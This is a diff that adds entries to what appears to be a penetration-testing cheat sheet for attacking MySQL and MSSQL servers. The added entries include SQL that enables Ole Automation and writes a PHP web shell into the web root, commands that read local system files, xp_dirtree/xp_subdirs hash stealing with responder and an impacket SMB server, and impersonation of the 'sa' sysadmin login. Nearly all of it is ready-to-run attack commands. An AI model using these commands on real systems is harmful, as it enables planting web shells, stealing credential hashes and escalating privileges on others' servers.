@@ -1026,12 +1026,63 @@ SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshe
 # MySQL - Secure File Privileges
 show variables like "secure_file_priv";
 
+# MSSQL - Enable Ole Automation Procedures
+1> sp_configure 'show advanced options', 1
+2> GO
+3> RECONFIGURE
+4> GO
+5> sp_configure 'Ole Automation Procedures', 1
+6> GO
+7> RECONFIGURE
+8> GO
+
+# MSSQL - Create a File
+1> DECLARE @OLE INT
+2> DECLARE @FileID INT
+3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+6> EXECUTE sp_OADestroy @FileID
+7> EXECUTE sp_OADestroy @OLE
+8> GO
+
+# Read Local Files
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+# MySQL - Read Local Files in MySQL
+mysql> select LOAD_FILE("/etc/passwd");
+
 
 # Hash stealing using the xp_dirtree command in MSSQL.
 EXEC master..xp_dirtree '\\10.10.110.17\share\'
 
 # Hash stealing using the xp_subdirs command in MSSQL.
 EXEC master..xp_subdirs '\\10.10.110.17\share\'
+
+# Retrieve the hash 
+sudo responder -I tun0
+sudo impacket-smbserver share ./ -smb2support
+
+# Identify Users that We Can Impersonate
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> GO
+
+# Verifying our Current User and Role
+1> SELECT SYSTEM_USER
+2> SELECT IS_SRVROLEMEMBER('sysadmin')
+3> go
+
+# Impersonating the SA User
+1> EXECUTE AS LOGIN = 'sa'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> GO
+
+# Identify linked Servers in MSSQL
+SELECT srvname, isremote FROM sysservers
 
 # Identify the user and its privileges used for the remote connection in MSSQL.
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
